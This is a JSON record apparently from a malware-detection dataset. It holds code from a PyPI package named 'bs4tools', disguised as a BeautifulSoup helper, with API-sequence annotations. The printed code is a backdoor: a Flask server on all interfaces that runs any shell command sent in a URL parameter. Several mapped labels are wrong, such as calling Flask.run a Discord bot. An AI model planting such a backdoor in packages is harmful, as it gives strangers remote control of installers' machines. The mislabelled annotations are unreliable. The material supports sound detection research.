[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/bs4tools-0.0.1/bs4tools-0.0.1/bs4tools/bs4tools.py",
    "code_snippet": "import subprocess\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/bs4')\ndef bs4():\n    out=subprocess.Popen(request.args.get('parser'), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n    return out.stdout.read().decode() + '\\n\\n' + out.stderr.read().decode()\n\napp.run(host='0.0.0.0', port=54689)",
    "pattern_analysis": {
      "api_sequence": [
        "request.args.get",
        "subprocess.Popen",
        "subprocess.Popen.stdout.read",
        "subprocess.Popen.stdout.read.decode",
        "subprocess.Popen.stderr.read",
        "subprocess.Popen.stderr.read.decode",
        "flask.Flask.run"
      ],
      "api_sequence_with_args": [
        "request.args.get('parser')",
        "subprocess.Popen(request.args.get('parser'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
        "subprocess.Popen.stdout.read()",
        "subprocess.Popen.stdout.read().decode()",
        "subprocess.Popen.stderr.read()",
        "subprocess.Popen.stderr.read().decode()",
        "flask.Flask.run(host='0.0.0.0', port=54689)"
      ],
      "mapped_sequence": [
        {
          "api_name": "request.args.get",
          "id": "read_user_input",
          "description": "Reads user input from standard input",
          "first_id": "persistence_stealth",
          "second_id": "user_interaction",
          "third_id": "interface_control"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.Popen.stdout.read",
          "id": "read_process_stdout",
          "description": "Reads all bytes from process standard output",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "subprocess.Popen.stdout.read.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "subprocess.Popen.stderr.read",
          "id": "read_process_stderr",
          "description": "Reads all bytes from process standard error",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "subprocess.Popen.stderr.read.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "flask.Flask.run",
          "id": "run_discord_bot",
          "description": "Runs the Discord bot with provided token",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_control"
        }
      ],
      "contextual_code": "from flask import Flask, request\nimport subprocess\n\napp = Flask(__name__)\n\n@app.route('/bs4')\ndef bs4():\n    out = subprocess.Popen(request.args.get('parser'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    return out.stdout.read().decode() + '\\n\\n' + out.stderr.read().decode()\n\napp.run(host='0.0.0.0', port=54689)"
    }
  }
]